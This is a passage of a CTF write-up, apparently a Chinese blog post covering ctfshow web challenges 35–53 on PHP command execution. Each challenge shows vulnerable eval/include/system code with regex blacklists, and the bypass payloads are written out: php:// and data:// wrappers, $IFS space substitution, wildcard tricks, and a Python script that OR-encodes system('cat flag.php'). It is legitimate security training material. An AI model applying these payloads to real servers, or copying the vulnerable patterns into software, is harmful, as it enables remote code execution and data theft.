if(!preg_match(&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了&lt;和=</p><p>没啥区别同上</p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a>web36</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/flag|system|php|cat|sort|shell|\.| |\&#x27;|\`|echo|\;|\(|\:|\&quot;|\&lt;|\=|\/|[0-9]/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$c</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为过了数字所以需要改一下exp：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span><span class="variable">$_GET</span>[a]?%<span class="number">3</span>E&amp;a=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h2><p>伪协议的利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因为不是eval所以上述方法不行了，但可以使用data://协议</p><p>当然php://input 也可</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=data://text/plain,&lt;?php cat fl*g.php ?&gt;</span><br></pre></td></tr></table></figure><h3 id="data-协议"><a href="#data-协议" class="headerlink" title="data:// 协议"></a><code>data://</code> 协议</h3><ul><li><p><strong>条件</strong>：</p><ul><li><code>allow_url_fopen</code>:on</li><li><code>allow_url_include</code> :on</li></ul></li><li><p><strong>作用</strong>：自<code>PHP&gt;=5.2.0</code>起，可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。</p></li><li><p><strong>用法</strong>：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="regexp">//</span>text/plain,</span><br><span class="line">data:<span class="regexp">//</span>text/plain;base64,</span><br></pre></td></tr></table></figure></li></ul><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a>web38</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag|php|file/i&quot;, $c))&#123;</span><br><span class="line">        include($c);</span><br><span class="line">        echo $flag;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a>web39</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/flag/i&quot;, $c))&#123;</span><br><span class="line">        include($c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>试了一下，因为传入的数据php已经闭合了，所以后面.php被当成了html的内容在页面上显示了。</p><p><img src="https://img-blog.csdnimg.cn/4c52e7b201c448269cba06fe454f363e.png" alt="img"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" alt="点击并拖拽以移动"></p><p>直接用原来的方法一样处理</p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h2><p>虚晃我一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看见括号被过滤了，结果仔细看是中文括号，那与web30类似。看了b站看了群主的姿势记录一下</p><p>获取到值</p><p><img src="https://img-blog.csdnimg.cn/0b5e073410cb4a078aa62754a18dc652.png" alt="img"></p><p><img src="https://img-blog.csdnimg.cn/fcc7c2a705794328a2d815d827c6c0ab.png" alt="img"></p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?c=eval(array_pop(next(get_defined_vars())));</span><br><span class="line">[post data]</span><br><span class="line">a=system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure><h2 id="web41"><a href="#web41" class="headerlink" title="web41(|)"></a>web41(|)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i&#x27;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;echo(<span class="subst">$c</span>);&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这题真滴bt</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=</span><br><span class="line"></span><br><span class="line">a=[]</span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for i in range(0,256):</span><br><span class="line">    c=chr(i)</span><br><span class="line">    tmp = re.match(r&#x27;[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-&#x27;,c, re.I)</span><br><span class="line">    if(tmp):</span><br><span class="line">        continue</span><br><span class="line">        #print(tmp.group(0))</span><br><span class="line">    else:</span><br><span class="line">        a.append(i)</span><br><span class="line"></span><br><span class="line"># eval(&quot;echo($c);&quot;);</span><br><span class="line">mya=&quot;system&quot;  #函数名 这里修改！</span><br><span class="line">myb=&quot;cat flag.php&quot;      #参数</span><br><span class="line">def myfun(k,my):</span><br><span class="line">    global ans1</span><br><span class="line">    global ans2</span><br><span class="line">    for i in range (0,len(a)):</span><br><span class="line">        for j in range(i,len(a)):</span><br><span class="line">            if(a[i]|a[j]==ord(my[k])):</span><br><span class="line">                ans1+=chr(a[i])</span><br><span class="line">                ans2+=chr(a[j])</span><br><span class="line">                return;</span><br><span class="line">for k in range(0,len(mya)):</span><br><span class="line">    myfun(k,mya)</span><br><span class="line">data1=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line">ans1=&quot;&quot;</span><br><span class="line">ans2=&quot;&quot;</span><br><span class="line">for k in range(0,len(myb)):</span><br><span class="line">    myfun(k,myb)</span><br><span class="line">data2=&quot;(\&quot;&quot;+ans1+&quot;\&quot;|\&quot;&quot;+ans2+&quot;\&quot;)&quot;</span><br><span class="line"></span><br><span class="line">data=&#123;&quot;c&quot;:data1+data2&#125;</span><br><span class="line">r=requests.post(url=url,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a>web42</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>shell的知识</p><p><strong>1&gt;/dev/null 2&gt;&amp;1的含义</strong> </p><p>&gt; 代表重定向到哪里，例如：echo “123” &gt; /home/123.txt<br>1 表示stdout标准输出，系统默认值是1，所以”&gt;/dev/null”等同于”1&gt;/dev/null”<br>2 表示stderr标准错误<br>&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于1 </p><p>双写绕过 exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat flag.php;ls</span><br></pre></td></tr></table></figure><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a>web43</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了cat和；</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl flag.php%0als</span><br></pre></td></tr></table></figure><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a>web44</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了flag</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl fl?g.php%0als</span><br></pre></td></tr></table></figure><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a>web45</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| /i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤了空格，所以用shell默认的$IFS</p><p>exp1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac$IFS$9fl?g.php%0a              tac$&#123;IFS&#125;fl?g.php%0a  </span><br></pre></td></tr></table></figure><p>exp2:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo$IFS`tac$IFS*`%0A</span><br></pre></td></tr></table></figure><h2 id="web46"><a href="#web46" class="headerlink" title="web46"></a>web46</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>空格编码成%09(需要php环境)    &amp;&amp;实行两个命令，同样编码执行</p><p>exp1:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tac%09fl?g.php%26%26ls</span><br></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h2 id="web47"><a href="#web47" class="headerlink" title="web47"></a>web47</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥影响，同上</p><h2 id="web48"><a href="#web48" class="headerlink" title="web48"></a>web48</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥影响，可见封命令是没头的，不如封符号来的有威力</p><h2 id="web49"><a href="#web49" class="headerlink" title="web49"></a>web49</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没啥影响，因为url编码在服务器解码后，他接受到的字符并没有%了</p><h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;, $c))&#123;</span><br><span class="line">        system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：利用此时不能用？通配符了，不支持</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl&lt;fla&#x27;&#x27;g.php||</span><br></pre></td></tr></table></figure><h2 id="web51"><a href="#web51" class="headerlink" title="web51"></a>web51</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同上</p><h2 id="web52"><a href="#web52" class="headerlink" title="web52"></a>web52</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        system(<span class="variable">$c</span>.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又开启了$</p><p>直接来exp1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$&#123;IFS&#125;fla?.php||ls</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/dd060d9eaab845f4a240fc8b83c355a0.png" alt="img"></p><p>发现flag是假的根目录底下还有一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$&#123;IFS&#125;/fla?%7C%7Cls</span><br></pre></td></tr></table></figure><p>exp2：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nl$IFS/fla&#x27;&#x27;g||</span><br></pre></td></tr></table></figure><h2 id="web53"><a href="#web53" class="headerlink" title="web53"></a>web53</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, <span class="variable">$c</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$c</span>);</span><br><span class="line">        <span class="variable">$d</span> = system(<span class="variable">$c</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.<span class="variable">$d</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;no&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp1：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 